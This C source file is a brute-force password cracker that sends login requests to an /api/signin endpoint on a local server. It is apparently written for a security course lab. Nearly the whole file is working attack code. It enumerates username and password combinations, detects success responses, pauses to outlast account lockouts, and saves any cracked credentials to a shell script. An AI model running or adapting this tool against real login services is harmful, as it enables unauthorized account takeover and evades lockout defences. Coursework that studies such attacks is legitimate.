/*
 * Password Cracker - Brute Force Attack Tool
 * 
 * Two Attack Modes:
 * Mode 1: Crack both username (5 chars: a-z,A-Z,0-9) and password (8 chars: a-z,A-Z,0-9,@#$&)
 * Mode 2: Crack password only with known username
 * 
 * Attacks the authentication server via HTTP requests
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>
#include <sys/stat.h>

#define SERVER_PORT 3000
#define SERVER_IP "127.0.0.1"
#define BUFFER_SIZE 4096

// Character sets for brute force
const char username_charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const char password_charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$&";

// Statistics
long long total_attempts = 0;
long long successful_attempts = 0;
struct timeval start_time;

// Send HTTP POST request to server
int send_signin_request(const char *username, const char *password, char *response, int response_size) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);
    
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
    
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }
    
    char request[1024];
    char body[512];
    sprintf(body, "{\"username\":\"%s\",\"password\":\"%s\"}", username, password);
    
    sprintf(request,
        "POST /api/signin HTTP/1.1\r\n"
        "Host: localhost:%d\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %ld\r\n"
        "Connection: close\r\n"
        "\r\n%s", SERVER_PORT, strlen(body), body);
    
    send(sock, request, strlen(request), 0);
    
    int bytes_read = recv(sock, response, response_size - 1, 0);
    if (bytes_read > 0) {
        response[bytes_read] = '\0';
    } else {
        response[0] = '\0';
    }
    
    close(sock);
    return bytes_read;
}

// Check if response indicates success
int is_success_response(const char *response) {
    return strstr(response, "\"ok\":true") != NULL || 
           strstr(response, "signin successful") != NULL;
}

// Check if account is locked
int is_locked_response(const char *response) {
    return strstr(response, "account locked") != NULL ||
           strstr(response, "account is banned") != NULL;
}

// Generate next username combination (5 characters)
int next_username(char *username, int len) {
    int charset_len = strlen(username_charset);
    
    for (int i = len - 1; i >= 0; i--) {
        char *pos = strchr(username_charset, username[i]);
        if (!pos) return 0;
        
        int idx = pos - username_charset;
        if (idx < charset_len - 1) {
            username[i] = username_charset[idx + 1];
            return 1;
        } else {
            username[i] = username_charset[0];
        }
    }
    return 0;
}

// Generate next password combination (8 characters)
int next_password(char *password, int len) {
    int charset_len = strlen(password_charset);
    
    for (int i = len - 1; i >= 0; i--) {
        char *pos = strchr(password_charset, password[i]);
        if (!pos) return 0;
        
        int idx = pos - password_charset;
        if (idx < charset_len - 1) {
            password[i] = password_charset[idx + 1];
            return 1;
        } else {
            password[i] = password_charset[0];
        }
    }
    return 0;
}

// Display progress
void display_progress(const char *username, const char *password) {
    struct timeval current_time;
    gettimeofday(&current_time, NULL);
    
    long long elapsed = (current_time.tv_sec - start_time.tv_sec) * 1000000 +
                       (current_time.tv_usec - start_time.tv_usec);
    double seconds = elapsed / 1000000.0;
    double rate = total_attempts / (seconds > 0 ? seconds : 1);
    
    printf("\r[Attempts: %lld] [Rate: %.0f/s] Testing: %s / %s          ",
           total_attempts, rate, username, password);
    fflush(stdout);
}

// Mode 1: Crack both username and password
void crack_both(int max_attempts) {
    printf("\n=== MODE 1: Cracking both username and password ===\n");
    printf("Username: 5 chars (a-z, A-Z, 0-9)\n");
    printf("Password: 8 chars (a-z, A-Z, 0-9, @, #, $, &)\n");
    printf("No limit - will run until found!\n\n");
    
    char username[6] = "aaaaa";
    char password[9] = "aaaaaaaa";
    char response[BUFFER_SIZE];
    
    gettimeofday(&start_time, NULL);
    time_t start_t = time(NULL);
    printf("[START] %s", ctime(&start_t));
    
    do {
        // Reset password for each username
        strcpy(password, "aaaaaaaa");
        
        do {
            total_attempts++;
            
            // Display every password attempt in real-time
            printf("\r[Attempt %lld] Trying: %s / %s        ", total_attempts, username, password);
            fflush(stdout);
            
            if (total_attempts % 100 == 0) {
                printf("\n");
                display_progress(username, password);
            }
            
            int result = send_signin_request(username, password, response, BUFFER_SIZE);
            
            if (result > 0) {
                if (is_success_response(response)) {
                printf("\n\n✓ SUCCESS FOUND!\n");
                printf("Username: %s\n", username);
                printf("Password: %s\n", password);
                printf("Total attempts: %lld\n", total_attempts);
                
                struct timeval end_time;
                gettimeofday(&end_time, NULL);
                time_t end_t = time(NULL);
                printf("[END] %s", ctime(&end_t));
                
                double elapsed = (end_time.tv_sec - start_time.tv_sec) +
                               (end_time.tv_usec - start_time.tv_usec) / 1000000.0;
                printf("\n⏱️  Time taken: %.2f seconds (%.2f minutes)\n", elapsed, elapsed/60.0);                    // Write credentials to shell script
                    FILE *fp = fopen("cracked_credentials.sh", "w");
                    if (fp) {
                        fprintf(fp, "#!/bin/bash\n");
                        fprintf(fp, "# Cracked Credentials\n");
                        fprintf(fp, "# Found at: %s\n", ctime(&end_time.tv_sec));
                        fprintf(fp, "\n");
                        fprintf(fp, "USERNAME=\"%s\"\n", username);
                        fprintf(fp, "PASSWORD=\"%s\"\n", password);
                        fprintf(fp, "\n");
                        fprintf(fp, "echo \"Cracked Credentials:\"\n");
                        fprintf(fp, "echo \"Username: $USERNAME\"\n");
                        fprintf(fp, "echo \"Password: $PASSWORD\"\n");
                        fclose(fp);
                        chmod("cracked_credentials.sh", 0755);
                        printf("\n✓ Credentials saved to: cracked_credentials.sh\n");
                    }
                    return;
                }
                
                if (is_locked_response(response)) {
                    printf("\n[!] Account locked, waiting 25 seconds...\n");
                    sleep(25);
                }
            }
            
            usleep(10000); // 10ms delay between requests
            
        } while (next_password(password, 8));
        
    } while (next_username(username, 5));
    
    printf("\n\nNo valid credentials found after %lld attempts.\n", total_attempts);
}

// Mode 2: Crack password with known username
void crack_password_only(const char *known_username, int max_attempts) {
    printf("\n=== MODE 2: Cracking password with known username ===\n");
    printf("Username: %s\n", known_username);
    printf("Password: 8 chars (a-z, A-Z, 0-9, @, #, $, &)\n");
    printf("No limit - will run until found!\n\n");
    
    char password[9] = "aaaaaaaa";
    char response[BUFFER_SIZE];
    
    gettimeofday(&start_time, NULL);
    
    do {
        total_attempts++;
        
        // Display every password attempt in real-time
        printf("\r[Attempt %lld] Trying: %s        ", total_attempts, password);
        fflush(stdout);
        
        if (total_attempts % 100 == 0) {
            printf("\n");
            display_progress(known_username, password);
        }
        
        int result = send_signin_request(known_username, password, response, BUFFER_SIZE);
        
        if (result > 0) {
            if (is_success_response(response)) {
                printf("\n\n✓ SUCCESS FOUND!\n");
                printf("Username: %s\n", known_username);
                printf("Password: %s\n", password);
                printf("Total attempts: %lld\n", total_attempts);
                
                struct timeval end_time;
                gettimeofday(&end_time, NULL);
                time_t end_t = time(NULL);
                printf("[END] %s", ctime(&end_t));
                
                double elapsed = (end_time.tv_sec - start_time.tv_sec) +
                               (end_time.tv_usec - start_time.tv_usec) / 1000000.0;
                printf("\n⏱️  Time taken: %.2f seconds (%.2f minutes)\n", elapsed, elapsed/60.0);
                
                // Write credentials to shell script
                FILE *fp = fopen("cracked_credentials.sh", "w");
                if (fp) {
                    fprintf(fp, "#!/bin/bash\n");
                    fprintf(fp, "# Cracked Credentials\n");
                    fprintf(fp, "# Found at: %s\n", ctime(&end_time.tv_sec));
                    fprintf(fp, "\n");
                    fprintf(fp, "USERNAME=\"%s\"\n", known_username);
                    fprintf(fp, "PASSWORD=\"%s\"\n", password);
                    fprintf(fp, "\n");
                    fprintf(fp, "echo \"Cracked Credentials:\"\n");
                    fprintf(fp, "echo \"Username: $USERNAME\"\n");
                    fprintf(fp, "echo \"Password: $PASSWORD\"\n");
                    fclose(fp);
                    chmod("cracked_credentials.sh", 0755);
                    printf("\n✓ Credentials saved to: cracked_credentials.sh\n");
                }
                return;
            }
            
            if (is_locked_response(response)) {
                printf("\n[!] Account locked, waiting 25 seconds...\n");
                sleep(25);
            }
        }
        
        usleep(10000); // 10ms delay between requests
        
    } while (next_password(password, 8));
    
    printf("\n\nNo valid password found after %lld attempts.\n", total_attempts);
}



void print_usage(const char *prog) {
    printf("Password Cracker - Brute Force Tool\n");
    printf("Usage: %s [mode] [options]\n\n", prog);
    printf("Modes:\n");
    printf("  1                  - Crack both username and password\n");
    printf("  2 <username>       - Crack password with known username\n\n");
    printf("Examples:\n");
    printf("  %s 1              - Mode 1 (default: 10000 attempts)\n", prog);
    printf("  %s 2 admin        - Mode 2 with username 'admin'\n\n", prog);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    int mode = atoi(argv[1]);
    int max_attempts = 10000;
    
    printf("\n");
    printf("╔═══════════════════════════════════════════════════╗\n");
    printf("║     PASSWORD CRACKER - BRUTE FORCE ATTACK         ║\n");
    printf("║          Information Data Security TP             ║\n");
    printf("╚═══════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("Server: http://%s:%d\n", SERVER_IP, SERVER_PORT);
   
    printf("\n");
    
    switch (mode) {
        case 1:
            crack_both(max_attempts);
            break;
        
        case 2:
            if (argc < 3) {
                printf("Error: Mode 2 requires username\n");
                printf("Usage: %s 2 <username>\n", argv[0]);
                return 1;
            }
            crack_password_only(argv[2], max_attempts);
            break;
        
        default:
            printf("Error: Invalid mode. Choose 1 or 2.\n");
            print_usage(argv[0]);
            return 1;
    }
    
    return 0;
}
